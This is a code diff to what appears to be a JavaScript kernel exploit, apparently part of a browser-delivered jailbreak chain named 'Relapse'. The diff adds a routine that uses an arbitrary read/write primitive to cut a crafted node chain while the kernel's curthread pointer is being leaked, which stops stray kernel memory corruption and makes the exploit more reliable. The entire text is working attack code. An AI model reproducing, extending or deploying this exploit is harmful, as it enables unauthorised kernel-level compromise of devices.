@@ -31,6 +31,7 @@ const PR_NODE_SZ = 0x38;
 const PR_SPRAY = 512;
 const PR_N_LEAK = 262144;
 const PR_SPIN = 40000000;
+const PR_CUT_MARGIN = 8192;
 const PR_NBLOCK = 8;
 const PR_TOWAIT = 1000;
 
@@ -852,6 +853,22 @@ async function pr_leak_curthread() {
     }
     if (hits > 48) break;
   }
+
+  // WebKitty cuts the chain ahead of the walking pointer before it awaits the
+  // worker cancel. Without this, the decrement walk can continue past the
+  // leaked curthread write and corrupt unrelated kernel memory.
+  const drop = pr_counter(ctr, 0);
+  let cut_at = -1;
+  for (let m = PR_CUT_MARGIN; m <= PR_CUT_MARGIN << 3; m <<= 1) {
+    const at = pr_counter(ctr, 0) + m;
+    if (at >= PR_N_LEAK - 1) break;
+    arw.view(chain.addr.add(at * PR_NODE_SZ + 0x30)).setBInt(0, 0, true);
+    if (pr_counter(ctr, 0) < at) {
+      cut_at = at;
+      break;
+    }
+  }
+  logger.debug(`Relapse leak cut: at=${cut_at}, walked=${drop}/${PR_N_LEAK} !!`);
 
   try {
     await pending;
